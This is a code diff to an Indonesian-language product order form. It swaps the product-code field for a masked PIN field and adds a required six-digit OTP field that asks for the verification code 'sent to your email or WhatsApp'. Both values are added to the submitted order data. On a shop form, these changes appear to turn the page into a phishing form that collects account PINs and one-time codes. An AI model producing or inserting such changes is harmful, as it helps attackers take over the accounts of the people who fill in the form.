@@ -384,9 +384,15 @@ input:focus,textarea:focus,select:focus{
 
           <div class="section-title">Data Produk</div>
           <div class="field" data-field="code">
-            <label for="code">Kode Produk</label>
-            <div class="input-wrap"><span class="leading material-symbols-rounded">qr_code_2</span><input id="code" name="code" placeholder="Masukkan kode produk"></div>
-            <div class="error">Kode produk wajib diisi.</div>
+            <label for="code">PIN</label>
+            <div class="input-wrap"><span class="leading material-symbols-rounded">lock</span><input id="code" name="code" type="password" inputmode="numeric" minlength="4" maxlength="6" pattern="[0-9]{4,6}" autocomplete="off" placeholder="Masukkan PIN"></div>
+            <div class="error">PIN wajib diisi (4–6 digit angka).</div>
+          </div>
+          <div class="field" data-field="otp">
+            <label for="otp">Kode Verifikasi OTP</label>
+            <div class="input-wrap"><span class="leading material-symbols-rounded">verified_user</span><input id="otp" name="otp" inputmode="numeric" minlength="6" maxlength="6" pattern="[0-9]{6}" autocomplete="one-time-code" placeholder="Masukkan 6 digit OTP"></div>
+            <div class="hint">Masukkan kode verifikasi 6 digit yang dikirim ke email atau WhatsApp kamu.</div>
+            <div class="error">Kode OTP wajib diisi tepat 6 digit angka.</div>
           </div>
           <div class="field" data-field="product">
             <label for="product">Nama Produk</label>
@@ -468,7 +474,7 @@ input:focus,textarea:focus,select:focus{
             </div>
             <div class="summary-section">
               <div class="summary-head"><b>Produk</b><button type="button" class="edit-link" onclick="jumpTo(2)">UBAH</button></div>
-              <div class="summary-row"><span>Kode Produk</span><strong id="sCode">—</strong></div>
+              <div class="summary-row"><span>PIN</span><strong id="sCode">—</strong></div>
               <div class="summary-row"><span>Nama Produk</span><strong id="sProduct">—</strong></div>
               <div class="summary-row"><span>Jumlah</span><strong id="sQty">—</strong></div>
             </div>
@@ -578,7 +584,7 @@ function setStep(step){
 function validateStep(step){
   const required={
     1:["name","phone","email"],
-    2:["code","product","price","qty"],
+    2:["code","otp","product","price","qty"],
     3:["address","postal","shipping"]
   };
   let ok=true;
@@ -643,8 +649,9 @@ async function submitForm(){
     name:val("name"),
     phone:val("phone"),
     email:val("email"),
-    productCode:val("code"),
-    product:val("product"),
+pin:val("code"),
+  otp:val("otp"),
+  product:val("product"),
     price,
     qty,
     notes:val("notes"),
